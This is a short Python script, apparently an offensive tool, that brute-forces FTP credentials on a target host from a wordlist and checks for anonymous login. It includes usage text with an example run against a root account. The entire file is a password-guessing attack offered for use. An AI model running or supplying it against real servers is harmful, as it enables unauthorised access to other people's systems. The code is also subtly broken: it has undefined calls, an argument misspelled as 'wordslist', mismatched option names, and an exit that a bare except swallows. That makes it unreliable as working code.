import argparse
import sys
from ftplib import FTP

info = ''' 

usage: ./ftp_brute_force.py [options]\n
options: -t, --target <hostname/ip>  |  Target\n
	 -u, --user <user>           |  user\n
	 -w, --wordlist <filename>   |  wordlist\n
	 -h, --help <help>           |  print help\n
example: ./ftp_brute_force.py -t 192.168.1.1 -u root -w /root/Desktop/wordloists.txt

'''


def help():
	print(info)
	sys.exit(0)

def check_anonymous_login(target):
	try:
		ftp = ftp(target)
		ftp = login()
		print("\n[+] anonymous login is open.")
		print("\n[+] username : anonymous")
		print("\n[+] password : anonymous")
		ftp.quit()
	except:
		pass


def ftp_login(target, username, password):
	try:
		ftp = FTP(target)
		ftp.login(username, password)
		ftp.quit()
		print("\n[!] credentials have found.")
		print("\n[!] username : {}".format(username))
		print("\n[!] password : {}".format(password))
		sys.exit(0)
	except:
		pass


def brute_force(target, username, wordlist):
	try:
		wordlist = open(wordlist, "r")
		words = wordlist.readlines()
		for word in words:
			word = word.strip()
			ftp_login(target, username, word)
	except:
		print("\n[-] there is no such wordlist file \n")
		sys.exit(0)


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")

args = parser.parse_args()

if not args.target or not args.username or not args.wordslist:
	help()
	sys.exit(0)

target = args.target
username = args.username
wordlist = args.wordlist

brute_force(target, username, wordlist)
check_anonymous_login(target)
print("\n[-] brute force finished. \n")